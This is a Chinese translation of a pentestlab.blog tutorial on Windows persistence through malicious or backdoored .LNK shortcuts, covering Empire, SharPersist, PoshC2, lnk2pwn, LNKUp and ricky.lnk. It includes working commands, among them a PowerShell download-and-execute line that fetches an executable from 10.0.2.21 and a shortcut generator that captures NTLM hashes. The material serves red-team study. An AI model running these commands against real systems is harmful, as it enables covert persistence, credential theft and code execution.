# Window权限维持（四）：快捷方式修改

来源: 03-干货系列\Window权限维持整理\Window权限维持（四）：快捷方式修改.pdf

Windows快捷方式包含对系统上安装的软件或文件位置（网络或本地）的引用。自从恶意软件出现之
初，便已将快捷方式用作执行恶意代码以实现持久性的一种方法。快捷方式的文件扩展名是.LNK，它为
红队提供了很多机会来执行各种格式的代码（exe，vbs，Powershell，scriptlet等）或窃取NTLM哈
希值。更隐蔽的方法是修改现有合法快捷方式的属性，但是生成具有不同特征的快捷方式可以为代码执
行提供灵活性。
Empire
 
Empire包含一个持久性模块，该模块可以后门合法的快捷方式（.LNK），以执行任意的PowerShell有
效负载。现有快捷方式的目标字段将被修改以执行存储在注册表项中的base64脚本。
Empire–后门现有快捷方式
查看快捷方式的属性将显示目标字段已成功修改以执行PowerShell有效负载。
usemodule persistence/userland/backdoor_lnk

Empire-修改后的快捷方式
由于快捷方式存在于启动文件夹中，因此暂存器将在下一次Windows登录中执行，并且将与命令和控
制服务器建立连接。
Empire-通过快捷方式成功上线
但是，Empire包含一个可用于生成具有LNK文件格式的暂存器的模块。

Empire-创建快捷方式
默认情况下，此模块将使用写字板图标伪装成可信任的应用程序。
Empire-写字板快捷方式
usestager windows/launcher_lnk
set Listener http
execute

快捷方式的目标字段将使用执行Base64有效负载的PowerShell命令填充。可以将快捷方式转移并移动
到启动文件夹中以保持持久性。
Empire-快捷属性
SharPersist
 
SharPersist能够创建Internet Explorer快捷方式，该快捷方式将执行任意有效负载并将其放置在启动
文件夹中以实现持久性。

SharPersist –快捷方式
当用户进行身份验证时，将执行有效负载，并打开Meterpreter会话.
SharPersist – Meterpreter
PoshC2
 
PoshC2可以创建一个LNK文件并将其直接放置在Windows启动文件夹中以保持持久性。可以通过执行
以下命令来调用此技术：
PoshC2 –启动LNK文件
在Windows登录期间，快捷方式将尝试在注册表项上执行值，该注册表项包含base64格式的stager。
SharPersist.exe -t startupfolder -c "cmd.exe" -a "/c C:\temp\pentestlab.exe" -f 
"pentestlab" -m add
install-persistence 3

PoshC2 –快捷方式
杂项
 
在常见的红色团队工具包之外，还有多个脚本可用于开发恶意快捷方式。将这些快捷方式放置在启动文
件夹中以保持持久性将是一个微不足道的过程，因为假定已经存在与命令和控制服务器的通信。
lnk2pwn是用Java编写的工具，可用于制作恶意快捷方式。可以通过命令控制台在生成快捷方式期间嵌
入任意命令。
lnk2pwn – GUI
默认情况下，lnk2pwn将生成伪造的记事本快捷方式，但是可以轻松更改图标。
java -jar lnk2pwn.jar

lnk2pwn –假记事本快捷方式
使用LNKUp python脚本可以实现类似的结果，该脚本可以生成可以执行任意命令或窃取目标用户的
NTLM哈希的快捷方式。
LNKUp – NTLM哈希快捷方式
由于生成的LNK文件将包含UNC路径，因此需要使用响应器，或者具有捕获NTLM哈希值的
Metasploit模块。
python generate.py --host 10.0.2.21 --type ntlm --output out.lnk
use auxiliary/server/capture/smb

LNKUp – NTLM捕获
密码哈希可以用于脱机破解或NTLM中继攻击，以便访问其他系统或用户的电子邮件。LNKUp还具有
生成将执行任意命令的快捷方式的功能。
LNKUp –执行命令
xillwillx开发了一个名为ricky.lnk的PowerShell脚本，该脚本可以创建一个以.unik字符欺骗的.LNK
文件，该字符反转.lnk扩展名并在文件末尾附加.txt。生成的扩展名将包含一个PowerShell命令，该命
令将从远程服务器下载文件并直接在系统上执行。
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -
ExecutionPolicy Bypass -noLogo -Command (new-object 
System.Net.WebClient).DownloadFile('http://10.0.2.21/pentestlab.exe','p
entestlab.exe');./pentestlab.exe; 
python generate.py --host 10.0.2.21 --type ntlm --output pentestlab.lnk --
execute "cmd.exe /c C:\temp\pentestlab.exe"

Tricky2 – PowerShell
或者，该项目包含一个VBS脚本，该脚本可以执行与PowerShell版本相同的操作。
Tricky – VBS脚本
译文声明：本文由Bypass整理并翻译，仅用于安全研究和学习之用。
原文地址：https://pentestlab.blog/2019/10/08/persistence-shortcut-modication/
 
